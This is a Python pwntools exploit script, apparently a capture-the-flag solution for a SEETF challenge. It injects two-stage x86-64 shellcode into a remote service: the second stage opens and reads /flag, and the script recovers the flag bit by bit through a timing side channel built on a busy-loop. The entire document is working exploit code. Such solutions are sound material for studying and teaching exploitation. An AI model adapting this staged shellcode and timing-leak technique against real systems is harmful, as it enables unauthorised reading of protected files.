from pwn import *
import time

def get_byte(offset):

    bin_str = ''

    for bit_offset in range(8):

        proc = remote('win.the.seetf.sg', 2002)

        # At this point rdi (first argument) is already set to 0.
        # Before entering our shellcode, rdx is already set to the address of our shellcode.
        # We can use this value as the 2nd argument to read.
        #    0x00005653ecfdc3ab <+514>:   mov    rax,QWORD PTR [rip+0x2cae]        # 0x5653ecfdf060 <shellcode_mem>
        #    0x00005653ecfdc3b2 <+521>:   mov    rdx,rax
        #    0x00005653ecfdc3b5 <+524>:   mov    eax,0x0
        #    0x00005653ecfdc3ba <+529>:   call   rdx
        # We don't have to modify the 3rd argument because rdx is large enough for our shellcode.

        stage1 = asm(f"""
        xor edi, edi
        mov esi, edx
        syscall
        """, arch='amd64')

        proc.send(stage1)

        stage2 = asm(("""
        .rept 0x6
        nop
        .endr
        """ 
            + shellcraft.amd64.linux.open('/flag')
            + shellcraft.amd64.linux.read('rax', 'rsp', 0x100)
            + f"""
            xor r11, r11
            xor rax, rax
            mov al, [rsp+{offset}]
            shr al, {bit_offset}
            shl al, 7
            shr al, 7
        loop:
            cmp rax, r11
            je end
            jmp loop
        end:
        """
        ), arch='amd64')

        proc.send(stage2)
        start = time.time()
        proc.recvall(timeout=1).decode()
        now = time.time()

        if (now - start) > 1:
            bin_str += '1'
        else:
            bin_str += '0'

    byte = int(bin_str[::-1], 2)

    return byte

flag = ''

for i in range(50):
    print(f'[+] Getting byte {i}...')
    b = chr(get_byte(i))
    flag += b

    print(flag)

    if b == '}':
        break